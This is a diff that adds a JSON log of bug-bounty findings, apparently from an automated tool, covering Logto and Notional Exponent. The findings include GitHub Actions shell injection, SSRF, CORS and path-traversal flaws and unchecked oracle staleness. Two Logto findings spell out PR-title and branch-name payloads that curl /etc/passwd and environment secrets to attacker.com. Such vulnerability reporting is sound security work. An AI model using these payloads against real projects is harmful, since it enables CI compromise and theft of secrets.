@@ -1,0 +1,106 @@
+{
+  "findings": [
+    {
+      "hash": "38fd13d66d305214",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "description": "commitlint.yml:34에서 `echo '${{ github.event.pull_request.title }}' | npx commitlint`를 확인했다. PR 타이틀이 single-quote로 감싸여 있지만, 외부 기여자가 PR 타이틀에 single-quote를 포함하면 shell 문자열에서 탈출 가능하다. `github.event.pull_request.title`은 PR을 여는 누구나 제어할 수 있는 외부 입력이며, GitHub Actions 컨텍스트 변수는 `run:` 스텝에서 런타임 shell 명령으로 직접 치환된다. | 공격자가 fork에서 악성 PR을 생성하며 타이틀을 `'; curl https://attacker.com/$(cat /etc/passwd | base64); echo '`로 설정. CI 환경에서 임의 명령 실행 가능. 시크릿 탈취, 소스코드 접근 등이 가능하다.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "cb79cc99ccaff1c0",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "description": "integration-test.yml:69에서 `gh workflow run rerun.yml -r ${{ github.head_ref || github.ref_name }}`를 확인했다. `github.head_ref`는 PR의 브랜치명으로 fork 기여자가 제어 가능하다. 인용 없이 직접 shell 명령에 삽입되므로, 브랜치명에 shell 메타문자 포함 시 임의 명령 실행이 가능하다. `github.head_ref`는 `pull_request` 이벤트에서 외부 기여자가 설정하는 값이다. | 공격자가 fork에서 브랜치명을 `main; curl https://attacker.com/$(env | base64 -w0) #`로 설정하고 PR을 생성. integration-test workflow가 실패하면 rerun 단계에서 임의 명령이 실행된다.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "74756b0242648c4f",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "CRITICAL",
+      "type": "Arbitrary Code Execution via VM Sandbox Escape",
+      "description": "runScriptFunctionInLocalVm() 함수가 Node.js vm 모듈의 runInNewContext()로 관리자가 제공한 스크립트를 실행함. 컨텍스트를 freeze하고 fetch만 노출하지만, payload 객체가 VM 컨텍스트에 그대로 전달되어 프로토타입 체인 공격 가능. fetch 접근으로 SSRF 공격도 가능.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "c7215ff934600833",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "SSRF via Unvalidated S3 Endpoint + Public ACL Hardcoding",
+      "description": "S3 업로드 시 ACL이 'public-read'로 하드코딩되어 모든 업로드 파일이 공개됨. endpoint 파라미터를 검증 없이 URL에 직접 연결하여 관리자가 http://169.254.169.254/ 같은 내부 주소를 endpoint로 설정하면 SSRF 발생.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "e927afe973f67aa6",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "CORS Policy Bypass via Path Prefix Wildcard",
+      "description": "allowedPrefixes 배열에 포함된 경로는 모든 Origin에서 접근 허용됨 (return origin ?? '*'). exposeHeaders: '*' 설정으로 모든 응답 헤더가 크로스오리진에 노출됨. 비프로덕션 환경에서는 모든 Origin 허용.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "f1681e8cbb792827",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "Tenant Isolation Bypass via Dynamic Regex",
+      "description": "matchDomainBasedTenantId()에서 URL 패턴의 '*'를 ([^.]*) 정규식으로 교체해 동적 정규식 생성. 패턴 자체가 사용자 제어 데이터에서 파생되면 ReDoS 또는 테넌트 경계 우회 가능. 매칭된 테넌트 ID의 유효성을 별도로 검증하지 않음.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "c4454f2100ada89c",
+      "track": "oss",
+      "domain": "Logto",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "Insecure File Upload - Path Traversal via Original Filename",
+      "description": "파일 업로드 시 file.originalFilename을 그대로 objectKey 경로에 포함. MIME 타입만 검증하고 실제 파일 내용(magic number) 검증 없음. ../를 포함한 파일명으로 S3 키 경로 조작 가능.",
+      "report_path": "/home/bjho/autoBounty/data/track2/reports/Logto_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    },
+    {
+      "hash": "1ae1d1857387f881",
+      "track": "web3",
+      "domain": "Notional Exponent",
+      "date": "2026-03-25",
+      "severity": "HIGH",
+      "type": "Oracle Staleness — Chainlink 가격 최신성 미검증",
+      "description": "ChainlinkUSDOracle.sol, Curve2TokenOracle.sol, PendlePTOracle.sol 의 _calculateBaseToQuote() 및 _getQuoteRate() 에서 Chainlink latestRoundData() 를 호출하면서 updatedAt 및 answeredInRound 를 완전히 무시합니다. MidasOracle.sol:50에서는 'if (mTokenUpdatedAt < updatedAt && (mTokenUpdatedAt < block.timestamp - 7 days)) updatedAt = mTokenUpdatedAt;' 처럼 staleness를 체크하지만 다른 오라클들은 미구현. 이 오라클들은 MorphoLendingRouter에서 vault 자체를 IOracle로 사용하는 구조에서(marketParams의 oracle: vault), AbstractYieldStrategy.convertYieldTokenToAsset()→TRADING_MODULE.getOraclePrice()를 통해 최종적으로 Morpho 담보 가치 계산에 사용됩니다.",
+      "report_path": "/home/bjho/autoBounty/data/track3/reports/Notional Exponent_2026-03-25_report.md",
+      "status": "pending_review",
+      "notes": ""
+    }
+  ],
+  "stats": {
+    "total": 8,
+    "pending_review": 8,
+    "submitted": 0,
+    "paid": 0
+  }
+}
